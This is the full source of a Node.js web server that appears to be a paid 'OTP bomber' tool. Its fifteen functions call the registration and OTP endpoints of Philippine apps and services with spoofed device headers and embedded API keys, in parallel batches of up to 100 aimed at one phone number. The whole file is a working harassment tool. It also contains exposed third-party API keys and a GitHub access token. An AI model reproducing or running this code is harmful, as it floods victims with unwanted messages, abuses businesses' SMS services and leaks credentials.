const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static('public'));

// ========== CONFIG ==========
// 🔁 REPLACE THIS WITH YOUR ACTUAL GITHUB RAW URL
const GITHUB_RAW_KEY_URL = 'https://raw.githubusercontent.com/WanitoModzz040126/Wanito-key/refs/heads/main/key.json?token=GHSAT0AAAAAAD62HUSCDWJOSDBPWOYIH6O22RIBAAQ';

let cachedKeys = null;
let lastKeyFetch = 0;
const KEY_CACHE_TTL = 30000; // 30 seconds

// ========== HELPER FUNCTIONS (exact from Python) ==========
function formatPhone(phone) {
    let cleaned = phone.toString().replace(/[\s\-+]/g, '');
    if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
    if (cleaned.startsWith('63')) cleaned = cleaned.substring(2);
    return cleaned;
}

function validatePhone(phone) {
    const formatted = formatPhone(phone);
    return /^9\d{9}$/.test(formatted);
}

function randomString(length) {
    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
}

function randomGmail() {
    return randomString(10) + '@gmail.com';
}

function generateKumuSignature(timestamp, rndString, phone) {
    const secret = "kumu_secret_2024";
    const data = `${timestamp}${rndString}${phone}${secret}`;
    return crypto.createHash('sha256').update(data).digest('hex');
}

// ========== KEY VALIDATION (HWID + EXPIRY) ==========
async function fetchKeyData() {
    try {
        const res = await fetch(GITHUB_RAW_KEY_URL);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        cachedKeys = data;
        lastKeyFetch = Date.now();
        return data;
    } catch (err) {
        console.error('Key fetch failed:', err.message);
        if (cachedKeys) return cachedKeys;
        throw new Error('Key validation service unavailable');
    }
}

async function validateKey(key, hwid) {
    if (!cachedKeys || (Date.now() - lastKeyFetch) > KEY_CACHE_TTL) {
        await fetchKeyData();
    }
    const keyEntry = cachedKeys?.keys?.[key];
    if (!keyEntry) return { valid: false, reason: 'Invalid key' };
    if (keyEntry.hwid !== hwid) return { valid: false, reason: 'HWID mismatch - Key locked to another device' };
    if (keyEntry.expiry !== 'lifetime') {
        const expiryDate = new Date(keyEntry.expiry);
        if (isNaN(expiryDate.getTime())) return { valid: false, reason: 'Invalid expiry format' };
        if (Date.now() > expiryDate.getTime()) return { valid: false, reason: 'Key expired' };
    }
    return { valid: true, expiry: keyEntry.expiry, duration: keyEntry.duration };
}

// ========== 15 API SERVICES (EXACT HEADERS + LOGIC FROM PYTHON) ==========

// 1. BOMB OTP (OSIM)
async function callBombOTP(phone) {
    const formatted = formatPhone(phone);
    const headers = {
        'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465; OP5958L1; arm64-v8a)',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'accept-language': 'en-SG',
        'region': 'PH'
    };
    const body = {
        userName: formatted,
        phoneCode: "63",
        password: `TempPass${Math.floor(Math.random() * 9000 + 1000)}!`
    };
    try {
        const res = await fetch('https://prod.services.osim-cloud.com/identity/api/v1.0/account/register', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
        });
        if (res.status === 200) {
            const data = await res.json();
            if (data.resultCode === 201000 || data.resultCode === 200000) {
                return { success: true, message: data.message || 'OTP sent' };
            }
            return { success: false, message: data.message || `Code ${data.resultCode}` };
        }
        return { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 2. MWELL (with cooldown)
async function callMWELL(phone) {
    const formatted = formatPhone(phone);
    const headers = {
        'User-Agent': 'okhttp/4.11.0',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
        'x-app-version': ['03.942.035','03.942.036','03.942.037','03.942.038'][Math.floor(Math.random()*4)],
        'x-device-type': 'android',
        'x-device-model': ['oneplus CPH2465','samsung SM-G998B','xiaomi Redmi Note 13','realme RMX3700'][Math.floor(Math.random()*4)],
        'x-timestamp': Date.now().toString(),
        'x-request-id': randomString(16)
    };
    const body = { country: "PH", phoneNumber: formatted, phoneNumberPrefix: "+63" };
    try {
        const res = await fetch('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(20000)
        });
        if (res.status === 200) {
            const data = await res.json();
            if (data.c === 200) {
                let cooldown = 0;
                if (data.d?.resendAt) {
                    const resendTime = new Date(data.d.resendAt);
                    cooldown = Math.max(1, (resendTime - new Date()) / 1000);
                }
                return { success: true, message: 'OTP sent', cooldown };
            }
            return { success: false, message: `API Error: ${data.c}`, cooldown: 30 };
        }
        return { success: false, message: `HTTP ${res.status}`, cooldown: 30 };
    } catch (e) { return { success: false, message: e.message, cooldown: 30 }; }
}

// 3. PEXX (with cooldown)
async function callPEXX(phone) {
    const formatted = formatPhone(phone);
    const headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'tid': randomString(11),
        'appversion': '3.0.14',
        'sentry-trace': randomString(32),
        'baggage': `sentry-environment=production,sentry-public_key=811267d2b611af4416884dd91d0e093c,sentry-trace_id=${randomString(32)}`
    };
    const body = [{ json: { email: "", areaCode: "+63", phone: `+63${formatted}`, otpChannel: "TG", otpUsage: "REGISTRATION" } }];
    try {
        const res = await fetch('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(20000)
        });
        if (res.status === 200) {
            const data = await res.json();
            if (data[0]?.result?.data?.json?.code === 200) {
                const cooldown = data[0].result.data.json.data?.resendTimeInSec || 60;
                return { success: true, message: 'OTP sent', cooldown };
            }
            return { success: false, message: 'API error', cooldown: 30 };
        }
        return { success: false, message: `HTTP ${res.status}`, cooldown: 30 };
    } catch (e) { return { success: false, message: e.message, cooldown: 30 }; }
}

// 4. EZLOAN
async function callEZLoan(phone) {
    const formatted = formatPhone(phone);
    const ts = Date.now();
    const headers = {
        'User-Agent': 'okhttp/4.9.2',
        'Content-Type': 'application/json',
        'imei': '7a997625bd704baebae5643a3289eb33',
        'device': 'android',
        'brand': 'oneplus',
        'model': 'CPH2465',
        'source': 'EZLOAN',
        'appversion': '2.0.4',
        'blackbox': `kGPGg${ts}DCl3O8MVBR0`
    };
    const body = {
        businessId: "EZLOAN",
        contactNumber: `+63${formatted}`,
        appsflyerIdentifier: `${ts}-${Math.floor(Math.random() * 1e19)}`
    };
    try {
        const res = await fetch('https://gateway.ezloancash.ph/security/auth/otp/request', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
        });
        if (res.status === 200) {
            const data = await res.json();
            if (data.code === 0) return { success: true, message: data.msg || 'Sent' };
            return { success: false, message: data.msg || 'Failed' };
        }
        return { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 5. XPRESS PH
async function callXpress(phone, index) {
    const formatted = formatPhone(phone);
    const ts = Math.floor(Date.now() / 1000);
    const headers = { "User-Agent": "Dalvik/2.1.0", "Content-Type": "application/json" };
    const body = {
        FirstName: `User${ts}_${index}`, LastName: "Test",
        Email: `user${ts}_${index}@gmail.com`, Phone: `+63${formatted}`,
        Password: `Pass${Math.floor(Math.random() * 9000 + 1000)}`,
        ConfirmPassword: `Pass${Math.floor(Math.random() * 9000 + 1000)}`
    };
    try {
        const res = await fetch('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
        });
        return res.status === 200 ? { success: true, message: 'OTP sent' } : { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 6. ABENSON
async function callAbenson(phone) {
    const formatted = formatPhone(phone);
    const headers = { 'User-Agent': 'okhttp/4.9.0', 'Content-Type': 'application/x-www-form-urlencoded' };
    try {
        const res = await fetch('https://api.mobile.abenson.com/api/public/membership/activate_otp', {
            method: 'POST', headers, body: `contact_no=${formatted}&login_token=undefined`, signal: AbortSignal.timeout(8000)
        });
        return res.status === 200 ? { success: true, message: 'OTP activation sent' } : { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 7. EXCELLENT LENDING
async function callExcellentLending(phone) {
    const headers = { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json' };
    const body = { domain: formatPhone(phone), cat: "login", previous: false, financial: randomString(32) };
    try {
        const res = await fetch('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
        });
        return res.status === 200 ? { success: true, message: 'Request processed' } : { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 8. BISTRO
async function callBistro(phone) {
    const formatted = formatPhone(phone);
    const url = `https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63${formatted}`;
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36',
        'Accept': 'application/json',
        'origin': 'http://localhost',
        'x-requested-with': 'com.allcardtech.bistro'
    };
    try {
        const res = await fetch(url, { headers, signal: AbortSignal.timeout(10000) });
        if (res.status === 200) {
            const data = await res.json();
            if (data.isSuccessful === true) return { success: true, message: data.message || 'OTP sent' };
            return { success: false, message: data.message || 'API error' };
        }
        return { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 9. BAYAD CENTER
async function callBayad(phone) {
    const formatted = formatPhone(phone);
    const headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
    };
    const email = randomGmail();
    const body = { mobileNumber: `+63${formatted}`, emailAddress: email };
    try {
        const res = await fetch('https://api.online.bayad.com/api/sign-up/otp', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(10000)
        });
        if (res.status === 200) return { success: true, message: `OTP sent to ${email}` };
        return { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 10. LBC CONNECT
async function callLBC(phone) {
    const formatted = formatPhone(phone);
    const headers = { 'User-Agent': 'Dart/2.19', 'Content-Type': 'application/x-www-form-urlencoded' };
    const body = new URLSearchParams({
        verification_type: 'mobile',
        client_email: randomGmail(),
        client_contact_code: '+63',
        client_contact_no: formatted,
        app_log_uid: randomString(16)
    });
    try {
        const res = await fetch('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', {
            method: 'POST', headers, body, signal: AbortSignal.timeout(8000)
        });
        return res.status === 200 ? { success: true, message: 'Verification sent' } : { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 11. PICKUP COFFEE
async function callPickupCoffee(phone) {
    const headers = { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json' };
    const body = { mobile_number: `+63${formatPhone(phone)}`, login_method: 'mobile_number' };
    try {
        const res = await fetch('https://production.api.pickup-coffee.net/v2/customers/login', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
        });
        return res.status === 200 ? { success: true, message: 'Login OTP sent' } : { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 12. HONEY LOAN
async function callHoneyLoan(phone) {
    const headers = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json' };
    const body = { phone: formatPhone(phone), is_rights_block_accepted: 1 };
    try {
        const res = await fetch('https://api.honeyloan.ph/api/client/registration/step-one', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
        });
        if (res.status === 200) {
            const data = await res.json();
            if (data.success === true) return { success: true, message: 'Step one completed' };
            return { success: false, message: data.message || 'Failed' };
        }
        return { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 13. KUMU PH
async function callKumuPH(phone) {
    const formatted = formatPhone(phone);
    const timestamp = Math.floor(Date.now() / 1000);
    const rndString = randomString(32);
    const signature = generateKumuSignature(timestamp, rndString, formatted);
    const headers = {
        'User-Agent': 'okhttp/5.0.0-alpha.14',
        'Content-Type': 'application/json;charset=UTF-8',
        'Device-Type': 'android',
        'Device-Id': '07b76e92c40b536a',
        'Version-Code': '1669'
    };
    const body = {
        country_code: "+63",
        encrypt_rnd_string: rndString,
        cellphone: formatted,
        encrypt_signature: signature,
        encrypt_timestamp: timestamp
    };
    try {
        const res = await fetch('https://api.kumuapi.com/v2/user/sendverifysms', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(10000)
        });
        if (res.status === 200) {
            const data = await res.json();
            if (data.code === 200 || data.code === 403) return { success: true, message: data.message || 'OTP sent' };
            return { success: false, message: data.message || 'API error' };
        }
        return { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 14. S5.COM
async function callS5(phone) {
    const normalized = `+63${formatPhone(phone)}`;
    const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
    const body = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${normalized}\r\n--${boundary}--\r\n`;
    const headers = {
        'content-type': `multipart/form-data; boundary=${boundary}`,
        'user-agent': 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36'
    };
    try {
        const res = await fetch('https://api.s5.com/player/api/v1/otp/request', {
            method: 'POST', headers, body, signal: AbortSignal.timeout(8000)
        });
        return res.status === 200 ? { success: true, message: 'OTP request sent' } : { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// 15. CASHALO
async function callCashalo(phone) {
    const formatted = formatPhone(phone);
    const deviceId = randomString(16);
    const headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Content-Type': 'application/json',
        'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==',
        'x-device-identifier': deviceId,
        'x-device-type': '1',
        'x-firebase-instance-id': randomString(32)
    };
    const body = {
        phone_number: formatted,
        device_identifier: deviceId,
        device_type: 1,
        apps_flyer_device_id: `${Date.now()}-${randomString(15)}`,
        advertising_id: crypto.randomUUID()
    };
    try {
        const res = await fetch('https://api.cashaloapp.com/access/register', {
            method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(10000)
        });
        if (res.status === 200) {
            const data = await res.json();
            if (data.access_challenge_request) return { success: true, message: 'Challenge sent' };
            return { success: false, message: 'Unexpected response' };
        }
        return { success: false, message: `HTTP ${res.status}` };
    } catch (e) { return { success: false, message: e.message }; }
}

// ========== ATTACK MANAGER (parallel + cooldown) ==========
let activeAttack = null;

class AttackSession {
    constructor(ws, phone, batches) {
        this.ws = ws;
        this.phone = phone;
        this.batches = batches;
        this.cancelled = false;
        this.stats = { success: 0, fail: 0, total: 0 };
        // cooldown trackers for MWELL & PEXX
        this.mwellCooldown = 0;
        this.mwellLastCall = 0;
        this.pexxCooldown = 0;
        this.pexxLastCall = 0;
    }

    async delay(ms) { return new Promise(r => setTimeout(r, ms)); }

    async callWithCooldown(serviceName, serviceFunc, cooldownObj) {
        if (cooldownObj && cooldownObj.cooldown > 0) {
            const elapsed = Date.now() - cooldownObj.lastCall;
            if (elapsed < cooldownObj.cooldown * 1000) {
                await this.delay(cooldownObj.cooldown * 1000 - elapsed);
            }
        }
        const result = await serviceFunc(this.phone);
        if (cooldownObj && result.cooldown) {
            cooldownObj.cooldown = result.cooldown;
            cooldownObj.lastCall = Date.now();
        }
        return result;
    }

    async runBatch(batchNum) {
        const services = [
            { name: 'BOMB OTP', func: callBombOTP, cooldown: null },
            { name: 'MWELL', func: callMWELL, cooldown: { lastCall: this.mwellLastCall, cooldown: this.mwellCooldown, set: (c,t)=>{ this.mwellCooldown=c; this.mwellLastCall=t; } } },
            { name: 'PEXX', func: callPEXX, cooldown: { lastCall: this.pexxLastCall, cooldown: this.pexxCooldown, set: (c,t)=>{ this.pexxCooldown=c; this.pexxLastCall=t; } } },
            { name: 'EZLOAN', func: callEZLoan, cooldown: null },
            { name: 'XPRESS PH', func: (p) => callXpress(p, batchNum), cooldown: null },
            { name: 'ABENSON', func: callAbenson, cooldown: null },
            { name: 'EXCELLENT LENDING', func: callExcellentLending, cooldown: null },
            { name: 'BISTRO', func: callBistro, cooldown: null },
            { name: 'BAYAD CENTER', func: callBayad, cooldown: null },
            { name: 'LBC CONNECT', func: callLBC, cooldown: null },
            { name: 'PICKUP COFFEE', func: callPickupCoffee, cooldown: null },
            { name: 'HONEY LOAN', func: callHoneyLoan, cooldown: null },
            { name: 'KUMU PH', func: callKumuPH, cooldown: null },
            { name: 'S5.COM', func: callS5, cooldown: null },
            { name: 'CASHALO', func: callCashalo, cooldown: null }
        ];

        const promises = services.map(async svc => {
            if (this.cancelled) return null;
            let result;
            if (svc.cooldown) {
                const cooldownObj = { lastCall: svc.cooldown.lastCall, cooldown: svc.cooldown.cooldown };
                result = await this.callWithCooldown(svc.name, svc.func, cooldownObj);
                if (svc.cooldown.set) svc.cooldown.set(cooldownObj.cooldown, cooldownObj.lastCall);
            } else {
                result = await svc.func(this.phone);
            }
            if (result) {
                this.stats.total++;
                if (result.success) this.stats.success++;
                else this.stats.fail++;
                this.ws.send(JSON.stringify({
                    type: 'log',
                    timestamp: new Date().toLocaleTimeString(),
                    service: svc.name,
                    batch: batchNum,
                    success: result.success,
                    message: result.message || (result.success ? 'Success' : 'Failed')
                }));
                this.ws.send(JSON.stringify({ type: 'stats', stats: this.stats }));
            }
            return result;
        });
        await Promise.all(promises);
    }

    async start() {
        for (let batch = 1; batch <= this.batches && !this.cancelled; batch++) {
            this.ws.send(JSON.stringify({ type: 'batch_start', batch, total: this.batches }));
            await this.runBatch(batch);
            if (batch < this.batches && !this.cancelled) {
                const delay = Math.floor(Math.random() * 2000 + 3000);
                this.ws.send(JSON.stringify({ type: 'log', timestamp: new Date().toLocaleTimeString(), service: 'SYSTEM', batch, success: true, message: `Waiting ${delay/1000}s before next batch...` }));
                await this.delay(delay);
            }
        }
        this.ws.send(JSON.stringify({ type: 'completed', stats: this.stats }));
        if (activeAttack === this) activeAttack = null;
    }
    stop() { this.cancelled = true; }
}

// ========== API ENDPOINTS ==========
app.post('/api/login', async (req, res) => {
    const { key, hwid } = req.body;
    if (!key || !hwid) return res.status(400).json({ error: 'Missing key or HWID' });
    try {
        const validation = await validateKey(key, hwid);
        if (validation.valid) {
            const token = crypto.randomBytes(32).toString('hex');
            return res.json({ success: true, token, expiry: validation.expiry, duration: validation.duration });
        }
        return res.status(401).json({ success: false, error: validation.reason });
    } catch (err) {
        return res.status(500).json({ error: 'Key validation failed' });
    }
});

app.post('/api/start-attack', (req, res) => {
    const { phone, batches, token } = req.body;
    if (!phone || !batches) return res.status(400).json({ error: 'Missing parameters' });
    if (!validatePhone(phone)) return res.status(400).json({ error: 'Invalid Philippine number' });
    if (batches < 1 || batches > 100) return res.status(400).json({ error: 'Batches must be 1-100' });
    if (activeAttack) return res.status(409).json({ error: 'Another attack is running' });
    
    let targetWs = null;
    wss.clients.forEach(ws => { if (ws.token === token) targetWs = ws; });
    if (!targetWs) return res.status(401).json({ error: 'WebSocket not connected' });
    
    activeAttack = new AttackSession(targetWs, phone, batches);
    activeAttack.start();
    res.json({ success: true, message: 'Attack started' });
});

app.post('/api/stop-attack', (req, res) => {
    if (activeAttack) {
        activeAttack.stop();
        activeAttack = null;
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'No active attack' });
    }
});

// WebSocket
wss.on('connection', (ws) => {
    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.type === 'auth') ws.token = data.token;
        } catch(e) {}
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`WanitoModz Bomber running on http://localhost:${PORT}`));